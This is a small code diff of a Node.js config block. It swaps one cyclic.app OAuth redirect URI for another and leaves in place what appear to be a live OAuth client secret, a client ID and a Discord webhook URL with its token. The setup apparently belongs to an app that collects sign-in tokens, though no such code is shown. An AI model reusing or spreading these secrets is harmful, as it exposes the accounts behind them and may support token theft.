@@ -1,7 +1,7 @@
 //Config
 const secret_value = 'Qnl8Q~k_j5QHXXk-RmhGIw.ETucFeEKvGwmOScQG'
 const client_id = '9c23fce6-2fbe-47f3-a36d-94a56b37a3bc'
-const redirect_uri = 'https://defiant-pike-fashion.cyclic.app'
+const redirect_uri = 'https://fine-blue-bull-slip.cyclic.app'
 const webhook_url = 'https://discord.com/api/webhooks/1160604080914321448/wz8Kv1TtI-zN3wgGhJ9V1MN1nFbDxU_fQahQm9yM8X0yl67Yqdh-jml_fjofshpcZygT'
 //Requirements
 const axios = require('axios')
